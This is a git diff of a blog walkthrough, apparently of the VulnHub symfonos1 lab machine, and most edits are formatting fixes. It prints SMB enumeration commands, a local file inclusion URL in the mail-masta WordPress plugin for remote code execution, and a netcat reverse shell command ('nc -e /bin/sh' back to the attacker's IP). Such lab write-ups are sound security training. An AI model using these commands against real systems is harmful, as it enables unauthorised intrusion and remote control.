@@ -11,7 +11,7 @@ Another series I ran across on vulnhub is the symfonos series, which is a total 
 
 ## Reconnaissance & Scanning
 
-After importing into VMware Workstation and booting up the machine, I ran **netdiscover** to find the IP address of the machine.
+After importing into VMware Workstation and booting up the machine, I ran `netdiscover -i eth0` to find the IP address of the machine.
 
 ![symfonos1 netdiscover](/assets/img/symfonos1-1.png)
 
@@ -35,15 +35,15 @@ I was able to connect as an anonymous user using **rpcclient** as shown below.
 
 ![symfonos1 rpcclient](/assets/img/symfonos1-5.png)
 
-Running **enumdomusers** results in a user, helios, being uncovered. Running **queryuser 0x3e8** displays info about that user. **getdompwinfo** displays that the minimum characters for the password are set to 5.
+Running `enumdomusers` results in a user, helios, being uncovered. Running `queryuser 0x3e8` displays info about that user. `getdompwinfo` displays that the minimum characters for the password are set to 5. However before attempting to brute force the password, I wanted to enumerate the smb shares based on the result of the **nmap** scan.
 
 ![symfonos1 rpcclient info](/assets/img/symfonos1-6.png)
 
-Next, I ran the smb-enum-shares script with nmap to enumerate smb shares
+Next, I ran the smb-enum-shares script with nmap to enumerate smb shares.
 
 ![symfonos1 rpcclient nmap smb-enum-shares](/assets/img/symfonos1-7.png)
 
-This showed several different shares that could be connected to anonymously **\\192.168.68.137\anonymous, \\192.168.68.137\IPC$, and \\192.168.68.137\print$**. There was also a **\\192.168.68.137\helios** share present that anonymous/guest access was disabled on.
+This showed several different shares that could be connected to anonymously **\\192.168.68.137\anonymous, \\192.168.68.137\IPC$,** and **\\192.168.68.137\print$**. There was also a **\\192.168.68.137\helios** share present that anonymous/guest access was disabled on.
 
 At this point, I tried to connect to the shares anonymous could access to see if anything could be pilfered. This was done with **smbclient**. The anonymous share was the first to be checked.
 
@@ -93,11 +93,11 @@ We will now send an email to Helios with a 1 line of PHP code that allows for RC
 
 ![symfonos1 smtp send](/assets/img/symfonos1-18.png)
 
-Navigating to **http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=pwd** will print the working directory after the output of helios' mail.
+Navigating to `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=pwd` will print the working directory after the output of helios' mail.
 
 ![symfonos1 smtp RCE](/assets/img/symfonos1-19.png)
 
-This means we should be able to create a reverse shell, lets create a netcat listener on our attacking machine with `nc -nvlp 5555` and then navigate to *8symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/sh 192.168.68.135 5555** in the web browser and press enter, this should connect to your netcat listener.
+This means we should be able to create a reverse shell, lets create a netcat listener on our attacking machine with `nc -nvlp 5555` and then navigate to `symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/sh 192.168.68.135 5555` in the web browser and press enter, this should connect to your netcat listener.
 
 ![symfonos1 website RCE](/assets/img/symfonos1-20.png)
 ![symfonos1 netcat connection](/assets/img/symfonos1-21.png)
